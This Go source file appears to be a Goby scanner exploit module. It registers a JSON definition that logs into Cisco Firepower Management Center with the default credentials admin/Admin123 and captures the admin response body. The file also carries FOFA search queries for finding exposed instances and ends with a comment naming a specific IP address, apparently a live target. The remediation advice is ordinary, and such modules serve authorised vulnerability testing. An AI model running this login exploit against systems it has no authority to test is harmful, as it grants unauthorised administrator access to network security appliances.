package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "Cisco Firepower Management Center default password",
    "Description": "<p>Default password Login There is a default password to log in to the administrator.The Cisco Firepower management Center provides rich intelligence on the users, applications, devices, threats, and vulnerabilities in your network.  It also uses these messages to analyze network vulnerabilities.  It then gives you tailored advice on what security policies you should deploy and what security incidents you should investigate, depending on the situation.  The administrator provides an easy-to-use policy interface to control access and defend against known attacks.  </p><p> Default password Login There is a default password to log in to the administrator.</p>",
    "Product": "Cisco Firepower Management Center",
    "Homepage": "https://www.cisco.com/",
    "DisclosureDate": "2022-06-27",
    "Author": "Xsw6a",
    "FofaQuery": "body=\"Cisco Firepower Management\"",
    "GobyQuery": "body=\"Cisco Firepower Management\"",
    "Level": "2",
    "Impact": "A default password exists and the administrator can log in.",
    "Recommendation": "<p>1. Modify the default password. The password should preferably contain uppercase and lowercaseletters, numbers, and special characters, with more than 8 digits.</p><p>2. If not necessary, prohibit public network access to the system.</p><p>3. Set access policies and whitelist access through security devices such as firewalls.</p>",
    "References": [
        "https://fofa.so/"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/auth/login",
                "follow_redirect": false,
                "header": {
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                "data_type": "text",
                "data": "username=admin&password=Admin123&endSession=1"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "\"username\":\"admin\"",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/auth/login",
                "follow_redirect": false,
                "header": {
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                "data_type": "text",
                "data": "username=admin&password=Admin123&endSession=1"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "\"username\":\"admin\"",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody||"
            ]
        }
    ],
    "Tags": [
        "Default Password"
    ],
    "VulType": [
        "Default Password"
    ],
    "CVEIDs": [],
    "CNNVD": [],
    "CNVD": [],
    "CVSSScore": "5",
    "Translation": {
        "CN": {
            "Name": "Cisco Firepower Management Center 默认口令漏洞",
            "Product": "Cisco Firepower Management Center",
            "Description": "<p><span style=\"color: rgb(32, 33, 36); font-size: 16px;\"><span style=\"color: rgb(234, 67, 53); font-size: 16px;\"></span>思科<span style=\"color: rgb(32, 33, 36); font-size: 16px;\">Firepower</span>管理中心提供有关您的网络中存在的用户、应用、设备、威胁和漏洞的丰富情报。 它也使用这些信 息分析网络的漏洞。 然后它会根据具体情况，就应该要部署的安全策略以及应该要调查的安全事件，为您提供量身 定制的建议。 管理中心提供易于使用的策略界面来控制访问和防范已知攻击。</span><br></p><p><span style=\"color: rgb(32, 33, 36); font-size: 16px;\">Cisco Firepower Management Center 存在默认口令，可获取管理员权限。</span></p>",
            "Recommendation": "<p>1、修改默认⼝令，密码最好包含⼤⼩写字⺟、数字和特殊字符等，且位数⼤于8位。</p><p>2、如⾮必要，禁⽌公⽹访问该系统。</p><p>3、通过防⽕墙等安全设备设置访问策略，设置⽩名单访问。<br></p>",
            "Impact": "<p><span style=\"color: rgb(32, 33, 36); font-size: 16px;\">Cisco Firepower Management Center 存在默认口令，可获取管理员权限。</span><br></p>",
            "VulType": [
                "默认口令"
            ],
            "Tags": [
                "默认口令"
            ]
        },
        "EN": {
            "Name": "Cisco Firepower Management Center default password",
            "Product": "Cisco Firepower Management Center",
            "Description": "<p>Default password Login There is a default password to log in to the administrator.The Cisco Firepower management Center provides rich intelligence on the users, applications, devices, threats, and vulnerabilities in your network.&nbsp;&nbsp;It also uses these messages to analyze network vulnerabilities.&nbsp;&nbsp;It then gives you tailored advice on what security policies you should deploy and what security incidents you should investigate, depending on the situation.&nbsp;&nbsp;The administrator provides an easy-to-use policy interface to control access and defend against known attacks. &nbsp;</p><p>&nbsp;Default password Login There is a default password to log in to the administrator.</p>",
            "Recommendation": "<p><span style=\"color: rgb(22, 51, 102); font-size: 16px;\">1. Modify the default password. The password should preferably contain uppercase and lowercaseletters, numbers, and special characters, with more than 8 digits.</span></p><p><span style=\"color: rgb(22, 51, 102); font-size: 16px;\">2. If not necessary, prohibit public network access to the system.</span></p><p><span style=\"color: rgb(22, 51, 102); font-size: 16px;\">3. Set access policies and whitelist access through security devices such as firewalls.</span><br></p>",
            "Impact": "<ul><li><p>A&nbsp;<span style=\"color: rgb(22, 51, 102); font-size: 16px;\">default password</span> exists and the administrator can log in.</p></li></ul>",
            "VulType": [
                "Default Password"
            ],
            "Tags": [
                "Default Password"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10688"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}
//https://115.114.115.181